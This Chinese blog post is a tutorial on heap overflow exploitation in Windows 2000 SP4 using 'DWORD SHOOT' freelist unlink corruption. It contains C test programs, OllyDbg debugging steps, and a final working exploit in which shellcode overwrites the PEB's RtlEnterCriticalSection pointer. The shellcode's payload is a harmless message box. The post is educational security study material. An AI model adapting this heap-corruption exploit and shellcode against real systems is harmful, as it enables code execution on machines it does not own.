---
layout:		post
title:		DWORD SHOOT堆溢出利用
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

VC 6.0新建一个工程, 贴入以下代码, 选择release版本

```
#include <windows.h>

int main()
{
	HLOCAL h1,h2,h3,h4,h5,h6;
	HANDLE hp;
	hp=HeapCreate(0,0x1000,0x10000);
	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h4=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h5=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h6=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	__asm int 3;

	HeapFree(hp,0,h1);
	HeapFree(hp,0,h3);
	HeapFree(hp,0,h5);

	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	
	return 0;
}
```

程序说明:

```
1.创建了一个0x1000的堆区。
2.连续申请了6个8 byte的堆块。
3.堆块间隔释放, 防止合并。
```


### 0x01 堆块释放

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x00.png)

内存区转到0x00360688, 这里是请求分配的6块8 byte堆块, 加上头部共16 byte

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x01.png)

然后释放第1块 h1, 将空闲块链入了freelist[2]

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x02.png)

再往下释放h3、h5, 链入freelist[2]


### 0x02 DWORD SHOOT

现在将0x03606C8处修改为0x44444444, 0x03606D0修改为0x00000000

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x03.png)

当再请求分配8 byte堆块(实际上16 byte), h5从freelist[2]中卸下

```
node->blink->flink = node->flink # [0x44444444] = 0x00000000, 异常
node->flink->blink = node->blink
```

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x04.png)


### 0x03 前置测试

VC 6.0新建一个工程, 贴入以下代码, 选择release版本

```
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

int main()
{
	HLOCAL h1=0,h2=0;
	HANDLE hp;
	hp=HeapCreate(0,0x1000,0x10000);
	__asm int 3;
	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
	
	memcpy(h1,shellcode,200);
	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);

	return 0;
}
```

OllyDbg附加上去, 内存区goto 0x00360688, 观察此时尾块头部

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x05.png)

单步到h1分配, 现在0x00360680是h1块的头部

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x06.png)

往下翻尾块的头部在0x00360750, 0x00360750-0x00360688=200, 中间相隔200 byte数据区

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x07.png)

单步到rep movsd, 现在数据区已经被0x90填充, 再往下就能覆盖尾块的头部

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x08.png)


### 0x04 植入代码

继续VC 6.0新建一个工程, 贴入以下代码, 选择release版本

```
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xb8\x20\xf0\xfd\x7f"
"\xbb\x03\x91\xf8\x77"		# RtlEnterCriticalSection的地址0x77f89103通过调试得到, 用来使shellcode调用ExitProcess时不产生异常
"\x89\x18"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x30\x75\x6e\x67\x68\x77\x6f\x6f\x79\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x16\x01\x1A\x00\x00\x10\x00\x00"		# 按之前调试得到的数据写回
"\x88\x06\x36\x00\x20\xf0\xfd\x7f";		# 0x00360688 shellcode起始地址, 0x7ffdf020 RtlEnterCriticalSection的指针地址(固定不变)

int main()
{
	HLOCAL h1=0,h2=0;
	HANDLE hp;
	hp=HeapCreate(0,0x1000,0x10000);
	//__asm int 3;
	//EnterCriticalSection(0);
	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
	
	memcpy(h1,shellcode,0x200);
	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);

	return 0;
}
```

取消main的两处注释, 通过调试得到RtlEnterCriticalSection的地址

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x09.png)

成功断下, 跟进RtlEnterCriticalSection, 得到地址0x77f89103

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x0a.png)

给EnterCriticalSection(0)处加上注释, 再调试一遍看DWORD SHOOT是否成功

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x0b.png)

直接到rep movsd, 内存区转到0x00360758, 可以看到成功覆盖尾块的flink、blink指针, 当h1卸下时(请求h2)将发生

```
h1->blink->flink = h1->flink
[0x7ffdf020] = 0x00360688
```

当进程退出时, 再调用临界区函数RtlEnterCriticalSection, 实际上调用shellcode, pwn~

![](/assets/img/exploit/2017-10-01-windows-2000-dwordshoot/0x0c.png)